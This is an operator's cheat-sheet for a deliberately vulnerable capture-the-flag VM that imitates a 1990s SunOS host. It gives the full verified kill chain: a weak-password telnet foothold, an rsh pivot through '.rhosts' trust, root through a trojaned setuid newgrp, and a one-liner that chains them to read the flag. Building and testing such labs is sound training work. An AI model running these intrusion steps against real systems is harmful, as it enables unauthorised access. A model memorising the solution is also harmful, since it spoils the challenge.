# Owner cheat-sheet — Box 1 "gaia"  (HackTheBox-style)

Operator/maintainer reference: the exact verified kill chain, the knobs to retune
difficulty, and how to reset, re-flag, and re-verify the box. This is the file you
use to **test and modify** the challenge. (Players: read `docs/field-manual.md`;
the full solution is in `docs/walkthrough.md`.)

The box is **FreeBSD 2.2.8 retrofitted to present as SunOS 4.1.4** — disclosed on
the login banner. Every weakness is real. See `docs/historicity.md` and
`docs/primer.md`.

---

## TL;DR kill chain (verified end-to-end by `build/95-solve.sh`)

| # | Step | What it abuses | Verified command |
|---|------|----------------|------------------|
| 1 | **Foothold** | weak contractor creds, telnet | `telnet 127.0.0.1 2323` → `brian` / `newriver` |
| 2 | **Enumerate** | world-readable shell history | `cat /home/pei/.bash_history` (leaks the whole path) |
| 3 | **Pivot** | `.rhosts "+ +"` r-services trust | `rsh localhost -l dono id` → `uid=105(dono)`, no password |
| 4 | **Privesc** | setuid-root trojaned `newgrp` | `newgrp -hack root` → `uid=0(root)` |
| 5 | **Exfil** | possession after transfer | pull `maniac1.3.4.tar.gz` off-box via FTP; flag is inside |

One-liner that proves 3→4→5 (what the automated test does):
```sh
echo 'id; cat /usr/src/sys/maniac/flag.txt' | rsh localhost -l dono 'newgrp -hack root'
```

> Note: `newgrp` is mode 4755 (world-executable setuid root), so it also escalates
> directly from `brian` — the `dono` hop is the *intended narrative* (mirrors the
> 1995 sessions), not a hard gate. To force the `.rhosts` step, see "Harden the
> path" below.

---

## The flag (derived, never static)

The flag is **computed**, not stored as literal text:
```
flag = BU{ <first16hex of md5(seed + instance_id)> _ <suffix> }
```
- `seed` is **yours only** — kept in a git-ignored `secret/flag.seed` (or `$BOX_FLAG_SEED`), never in the repo/image/history.
- `instance_id` (`BOX_FLAG_INSTANCE`) and `suffix` (`BOX_FLAG_SUFFIX`) are public in `config/box.env`.

**Know the current flag:**
```sh
build/flag.sh            # prints BU{...} for the current seed+instance
```
**Rotate / mint per-player flags:** change the seed (or `BOX_FLAG_INSTANCE`) and rebuild the loot:
```sh
echo 'a-new-long-random-secret' > secret/flag.seed     # or: export BOX_FLAG_SEED=...
sh build/payloads/loot/build-loot.sh                    # rebuilds the loot tarball
make inject                                             # re-plant (re-flag the box)
build/flag.sh                                           # the value the player must submit
```
On the disk a `grep -r 'BU{'` finds only a **decoy** (`BOX_FLAG_DECOY`); the real
flag is materialised at boot into a memory filesystem (see `build/payloads/gen-flag.sh`),
and the whole qcow2 is LUKS-encrypted (offline `qemu-nbd`/`libguestfs` hit ciphertext).
This raises the bar past lazy grep/mount — it is **not** DRM (a distributed VM, by
nature, lets a determined player who boots + roots it recover the value).

---

## Difficulty knobs (all in `config/box.env`)

| Knob | Effect |
|------|--------|
| `BOX_FOOTHOLD_USER` / `BOX_FOOTHOLD_PASS` | the starting account (default `brian`/`newriver`) |
| `BOX_TRUST_USER` | the `.rhosts`-trusting account you pivot to (`dono`) |
| `BOX_FWD_TELNET` / `BOX_FWD_FTP` / `BOX_FWD_SHELL` | host loopback ports (2323 / 2121 / 5514) |
| `BOX_FLAG_SEED` (out-of-tree) / `BOX_FLAG_INSTANCE` | rotate the flag |
| `BOX_HOSTNAME` / `BOX_DOMAIN` / `BOX_THEME` | the SunOS costume |
| `BOX_MEM_MB` / `BOX_CPU` / `BOX_OS_VERSION` | VM sizing / target OS (2.2.8 or 4.11) |

**Make it harder (ideas, by editing the payloads):**
- *Hide the breadcrumb:* make `~pei/.bash_history` mode `600` (then the player must
  find the trust another way) — edit the `chmod 644` in `build/payloads/inject-guest.sh`.
- *Force the `.rhosts` hop:* chmod `newgrp` to `4750 root:donogrp` so only `dono`
  (not `brian`) can run it — edit the trojan install in `inject-guest.sh`.
- *Remove the hand-holding:* trim the leaking lines in `build/payloads/files/pei.bash_history`.
- *Add noise:* the inert `in.pmd` artifact + `EVIDENCE.md` are already there as red herrings.

---

## Build / run / reset / verify

```sh
make build        # deps → fetch → iso → install → inject → theme  (SLOW: TCG, ~40 min)
make inject       # re-plant only (re-flag / re-tune) — needs an installed image
./run.sh          # boot host-only; players hit 127.0.0.1:{2323,2121,5514}
make verify       # static artifact checks (build/90-verify.sh)
build/95-solve.sh # AUTOMATED end-to-end solve gate (exits 0 only if root+flag reached)
```
**Reset to a known-good box:** the build keeps a clean snapshot
`dist/box1-gaia.built.qcow2`; restore it:
```sh
cp dist/box1-gaia.built.qcow2 dist/box1-gaia.qcow2
```
(The encrypted distributable is `dist/box1-gaia.enc.qcow2`; `run.sh` reads the LUKS
key from a git-ignored keyfile / `$BOX_LUKS_KEY` — never bake the key into the image.)

---

## Troubleshooting (lessons from building it)

| Symptom | Cause / fix |
|---|---|
| Telnet connects then "Connection closed by foreign host" | guest unreachable (no `ed1`/inetd). Network goes in `/etc/rc.conf.local`; check `ifconfig ed1` shows `10.0.2.15`. |
| `inetd: spwd.db: Inappropriate file type or format`, `No such user 'root'` | corrupt password DB — re-run `pwd_mkdb -p /etc/master.passwd`. Root cause was non-durable guest writes; the build now uses `cache=writethrough`. |
| Box won't boot, `boot:` reboot loop | boot2 drops the first char of a sent command — send boot input char-by-char. |
| Every boot does a long fsck | single-user `halt` doesn't unmount; remount `-o ro` before halt to mark the FS clean. |
| Everything is slow (minutes) | expected — i386 is emulated via QEMU TCG (no KVM on this host). Not a guest resource issue; 2.2.8 is happy in 32 MB. |

---

## Provenance / safety reminders

- Throwaway lab credentials only; host-only networking (`restrict=on`, no internet).
- The historicity of each element is cited to `~/takedown/TIMELINE.md` in `docs/historicity.md`.
- Hygiene before publishing: keep `secret/` and the LUKS keyfile out of git; the old
  static flag has been purged from history (`git log -S 'BU{' --all` should be clean).
